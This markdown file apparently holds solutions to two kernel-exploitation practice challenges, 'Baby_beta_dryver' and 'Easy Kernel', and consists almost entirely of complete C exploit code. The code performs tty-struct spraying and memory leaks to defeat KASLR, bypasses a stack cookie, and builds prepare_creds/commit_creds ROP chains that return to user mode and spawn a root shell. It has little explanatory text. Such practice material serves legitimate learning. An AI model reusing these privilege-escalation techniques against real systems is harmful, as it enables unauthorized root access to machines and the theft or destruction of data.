# Baby_beta_dryver

Solution for the baby_beta_driver challenge to practice kernel exploit:

```c
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

typedef struct ioctl_cmd{

	int size;
	int padding;
	char *data;

}ioctl_cmd;

static void win(){
	printf("[+] Current uid %d\n", geteuid());
	printf("[!] Enjoy your dpla-shell\n");
	system("/bin/sh");
}

unsigned long long user_cs;
unsigned long long user_ss;
unsigned long long user_sp;
unsigned long long user_rflags;


static void save_state()
{
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %2\n"
        "pushfq\n"
        "popq %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_sp), "=r"(user_rflags)
        :
        : "memory");
}

int main(){

	int fd = open("/dev/baby_beta_driver", 6);

	if(fd < 0){
		printf("[!] Failed to open! ");
	}
	else {
		printf("[+] Device open at file desc %d \n", fd);
	}

	//tty struct stuff fo leaking
	printf("[+] Spraying the tty struct\n");

	int fd_spray[50];
	for(int i=0;i<50;i++){
		fd_spray[i] = open("/dev/ptmx",7);
	}

	for(int i=0;i<50;i++){
		close(fd_spray[i]);

	}

	ioctl_cmd a;

	/* test ioctl

	a.data = malloc(0x200);
	memset(a.data,0x41,0x200);
	ioctl(fd,0x1337c0de,&a);

	*/

	//struct to create a chunk with no data
	a.size = 0x2d0;
	a.data = 0;

	//ioctl call
	printf("[+] Sending chunk with no data\n");
	ioctl(fd,0x1337c0de, &a);


	//reading the leak

	a.size = 0x30;
	a.data = malloc(0x200);

	ioctl(fd, 0xc0de1337, &a); //read

//	for(int i=0;i<0x30;i+=8){
//
//		printf("[*] Leaked address: 0x%11x\n", *(long long *)(a.data+i));

//	}

	for(int i = 0; i < 0x30; i+=8){
		printf("[*] Leaked address : 0x%llx\n", *(long long *)(a.data + i));

	}

	unsigned long long leak = *(long long *)(a.data+0x18);

	if(leak < 0xffffffff00000000){
		printf("[!] No proper leak found\n");
		exit(0);
		}
	else {
		printf("[!] Found ptm_unix98_ops leak\n");
	}


	unsigned long long base = leak - 0x623cc0;

	printf("[+] Kernel Base : 0x%llx\n", base);


	/*gadgets to rop

	0xffffffff8111a54d: pop rdi; ret;
		  */

	unsigned long long rdi = 0x11a54d + base;
	unsigned long long rsi = base + 0x05c00;
	unsigned long long swapgs = base + 0x200d6c;
	unsigned long long iretq = base + 0x14db6; //xchg rax, rdi; call qword ptr [rsi];
	unsigned long long rax_rdi = base + 0x4d424;//: add rdi, rax; cmp qword ptr [rdi + 0x58], rsi; je 0x24d431; mov eax, r8d; ret;
	unsigned long long prepare_creds = base + 0x53bb0;
	unsigned long long commit_creds = base + 0x53d00;
	unsigned long long ret2um = base + 0x200cc6;

	//overflow

	int i = 0;
	unsigned long long *rop = (unsigned long long *)a.data;

	//memset(rop, 0x41, 0x100);

	save_state();
	rop[i++] = 0;
	rop[i++] = 0;
	rop[i++] = 0;
	rop[i++] = 0;
	rop[i++] = 0;
	rop[i++] = 0;
	rop[i++] = 0;
	rop[i++] = 0;

	
	rop[i++] = rdi;
	rop[i++] = 0;
	rop[i++] = prepare_creds;
	rop[i++] = rdi;
	rop[i++] = 0;

	rop[i++] = rax_rdi;
	rop[i++] = commit_creds;
	//rop[i++] = swapgs;
	//rop[i++] = 0;
	//rop[i++] = iretq;
	rop[i++] = ret2um;
	rop[i++] = 0;
	rop[i++] = 0;

	rop[i++] = (unsigned long long) win;
	rop[i++] = user_cs;
	rop[i++] = user_rflags;
	rop[i++] = user_sp;
	rop[i++] = user_ss;

	a.size = 0x100;
	//overflow
	ioctl(fd, 0x1337c0de, &a);

	ioctl(fd, 0xc0de1337, &a);


}
```

# Easy Kernel

```c
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

typedef struct ioctl_cmd{

	int size;
	int padding;
	char *data;

}ioctl_cmd;



static void win(){

	int uid = getuid();
	printf("[+] Current uid %d \n", uid);
	if (uid == 0){	
		printf("[+] Dropping a Shell...\n");
		char *args[2];
    	args[0] = "/bin/sh";
    	args[1] = NULL;
    	execve(args[0], args, NULL);
	}
	
	else{
		printf("[!] No no no root shell, fix the exploit\n");
	
	}

}

unsigned long long user_cs;
unsigned long long user_ss;
unsigned long long user_sp;
unsigned long long user_rflags;


void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    puts("[*] Saved state");
}

int open_device(){

	int fd = open("/proc/pwn_device", 6);

	if(fd < 0){
		printf("[!] Failed to open device ! \n");
		printf("[!] Closing the exploit");
		exit(0);
	}
	else {
		printf("[+] Device open at file desc %d \n", fd);
		return fd;
	}
}

int main(){

	save_state();

	printf("[+] Executing n00biekerneldplapwn\n");
	
	int fd = open_device();
	
	char leak[0x100];
	unsigned long payload[0x400];

	memset(leak, 0, sizeof(leak));

	//read beyond the string on the stack (memory leak)
	if(!read(fd, leak, sizeof(leak))){
		printf("[!] Error trying to read from device driver\n");
		exit(0);
	}
	// reading leaked addresses from stack
	//int count = 0;
	//for(int i = 0; i < sizeof(leak); i+=8){
	//	printf("[*] Leaked address at stack offset (0x%x): 0x%llx\n", count*8, *(long long *)(leak + i));
	//	count++;
	//}

	//stack cookie
	unsigned long long stack_cookie = *(unsigned long long*)&leak[0x70];
	printf("[+] Stack cookie : %llx \n", stack_cookie);

	unsigned long long kernel_add = *(unsigned long long*)&leak[0xa8];
	printf("[+] Kernel Address : %llx\n", kernel_add);

	//calculating kernel base
	unsigned long long int base = kernel_add - 0x1c89f8;
	printf("[+] Kernel Base : %llx\n", base);

	//changing the MaxBuffer variable with the ioctl command
	
	
	if(ioctl(fd, 32, sizeof(payload))){
		printf("[!] Error tring to send ioctl cmd\n");
		printf("[!] Unable to change buffer size\n");
		exit(0);
	}
	printf("[!] MaxBuffer changed trough IOCTL\n");
	

	int offset = 0x80/8; //start from stack cookie

	unsigned long long int null_value= 0x0;
	unsigned long long int target_crush = 0xdeadbeef;
	unsigned long long int padding = 0x4242424242424242;
	
	memset((char*)payload, 0x43, 0x80); //filling up to stack cookie
	

	//gadgets offsets

	#define POPRDI 0x001518
	#define PREPARE_CREDS 0x881c0
	#define COMMIT_CREDS 0x87e80
	#define POP_RSI 0x00112e
	#define ADD_RDI_RAX 0x3c3485

	#define SWAPS_IRETQ_GADGET 0xc00a2f + 22

	unsigned long user_rip = (unsigned long)win;

	payload[offset++] = stack_cookie;
	payload[offset++] = padding;
	payload[offset++] = base + POPRDI;
	payload[offset++] = 0;
	payload[offset++] = base + PREPARE_CREDS;
	
	payload[offset++] = base + POP_RSI;
	payload[offset++] = 0;
	payload[offset++] = base + POPRDI;
	payload[offset++] = 0;
	payload[offset++] = base + ADD_RDI_RAX;
	payload[offset++] = base + COMMIT_CREDS;

	payload[offset++] = base + SWAPS_IRETQ_GADGET;
	payload[offset++] = 0;
	payload[offset++] = 0;
	
	payload[offset++] = user_rip;
	payload[offset++] = user_cs;
	payload[offset++] = user_rflags;
	payload[offset++] = user_sp;
	payload[offset++] = user_ss;

	
	printf("[+] Writing to device\n");
	write(fd,payload, sizeof(payload));



printf("[+] Terminating the worst pwn exploit by dpla ! \n");

}
```